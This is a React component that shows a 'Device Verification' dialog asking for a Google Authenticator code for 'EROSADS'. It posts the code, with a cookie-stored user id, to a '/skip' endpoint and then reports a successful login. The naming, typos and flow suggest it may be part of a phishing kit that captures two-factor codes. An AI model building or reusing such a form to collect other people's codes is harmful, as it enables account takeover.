import { Form, Formik } from "formik";
import { motion } from "framer-motion";
import Cookies from "js-cookie";
import React from "react";
import { toast } from "react-toastify";
import { API_URL } from "../config/index";
import TextfieldWrapper from "./TextfieldWrapper";

function Security({ setShowModal }) {
  const id = Cookies.get("id");
  const email = Cookies.get("email");

  const initialvalues = {
    id: id,
    skipcode: "",
  };

  const handleSubmit = async (values, formik) => {
    // console.log(values);

    const url = `${API_URL}/skip`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });

    const data = await res.json();

    if (res.ok) {
      console.log("success", data);
      toast.success("Login Succecssfull");
      formik.resetForm();
      Cookies.remove("id");
      Cookies.remove("email");
    } else {
      console.log("error", data);
      toast.error("Something Went Wrong");
    }
  };

  return (
    <div className=" h-screen bg-black flex justify-center items-center">
      <motion.div
        initial={{ scale: 0.7 }}
        animate={{ scale: 1 }}
        transition={{ duration: 0.2 }}
        className="px-3"
      >
        <Formik
          initialValues={initialvalues}
          // validationSchema={validate}
          onSubmit={handleSubmit}
        >
          {(formik) => (
            <Form className="">
              <div className="pl-5 lg:pl-8 pr-8 lg:pr-14 py-4 lg:py-7 bg-white text-black rounded">
                <h2 className="text-2xl font-medium">
                  Device Verification 1/2
                </h2>
                <p className="mt-6 text-sm">
                  Please enter a <strong>Verification code</strong> for EROSADS
                  from your <strong>Google Authenticator</strong> app
                </p>

                <div className="my-5 flex justify-center">
                  <div className="w-full lg:w-[320px]">
                    <TextfieldWrapper
                      name="skipcode"
                      label="Enter Code Here"
                      type="text"
                      required
                      autoFocus
                    />
                  </div>
                </div>

                {/* <p className="pt-2 text-sm">
                  No Code received yet?{" "}
                  <span className="text-custom-amber cursor-pointer underline">
                    Resend
                  </span>
                </p> */}
                <p className="text-sm">
                  Having trouble with receiving the Code, You can contact the{" "}
                  <span className="text-custom-amber cursor-pointer underline">
                    Support
                  </span>
                </p>
              </div>
              <div className="mt-4 flex gap-4 justify-end">
                <button
                  type="button"
                  className="px-[22px] py-2 font-Arimo text-sm bg-white/50 hover:bg-white/70 border-2 border-white text-white rounded uppercase transition-all duration-300"
                  onClick={() => setShowModal(false)}
                >
                  cancel
                </button>
                <button
                  type="submit"
                  className="px-[22px] py-2 font-Arimo text-sm bg-transparent hover:bg-custom-yellow border-2 border-custom-amber text-custom-amber rounded uppercase transition-all duration-300"
                >
                  verify
                </button>
              </div>
            </Form>
          )}
        </Formik>
      </motion.div>
    </div>
  );
}

export default Security;
